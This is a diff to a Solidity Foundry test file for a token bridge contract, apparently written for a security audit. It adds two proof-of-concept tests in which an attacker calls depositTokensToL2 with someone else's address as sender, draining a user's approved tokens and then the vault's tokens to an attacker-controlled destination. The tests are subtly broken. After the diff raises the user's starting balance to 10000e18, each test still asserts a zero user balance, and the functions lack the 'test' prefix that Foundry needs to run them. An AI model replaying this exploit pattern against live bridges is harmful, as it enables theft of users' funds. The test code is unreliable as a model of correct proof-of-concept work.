@@ -27,7 +27,7 @@ contract L1BossBridgeTest is Test {
 
         // Deploy token and transfer the user some initial balance
         token = new L1Token();
-        token.transfer(address(user), 1000e18);
+        token.transfer(address(user), 10000e18);
 
         // Deploy bridge
         tokenBridge = new L1BossBridge(IERC20(token));
@@ -222,5 +222,36 @@ contract L1BossBridgeTest is Test {
         returns (uint8 v, bytes32 r, bytes32 s)
     {
         return vm.sign(privateKey, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));
+    }
+
+    function attackerCanMoveApprovedTokens() public {
+        uint256 amountOfTokens = 1000e18;
+        vm.startPrank(user);
+        token.approve(address(tokenBridge), amountOfTokens);
+        vm.stopPrank();
+        address attacker = makeAddr("Attacker");
+        vm.startPrank(attacker);
+        vm.expectEmit(address(tokenBridge));  
+        emit Deposit(user,attacker,amountOfTokens);
+        tokenBridge.depositTokensToL2(user,attacker,amountOfTokens);
+        vm.stopPrank();
+        assertEq(token.balanceOf(user),0);
+        assertEq(token.balanceOf(address(vault)),amountOfTokens);
+    }
+
+    function attackerCanMoveApprovedTokensFromVault() public {
+        uint256 amountOfTokens = 1000e18;
+        vm.startPrank(user);
+        token.approve(address(tokenBridge), amountOfTokens);
+        tokenBridge.depositTokensToL2(user,user,amountOfTokens);
+        vm.stopPrank();
+        address attacker = makeAddr("Attacker");
+        vm.startPrank(attacker);
+        vm.expectEmit(address(tokenBridge));  
+        emit Deposit(address(vault),attacker,amountOfTokens);
+        tokenBridge.depositTokensToL2(address(vault),attacker,amountOfTokens);
+        vm.stopPrank();
+        assertEq(token.balanceOf(user),0);
+        assertEq(token.balanceOf(address(vault)),amountOfTokens);
     }
 }
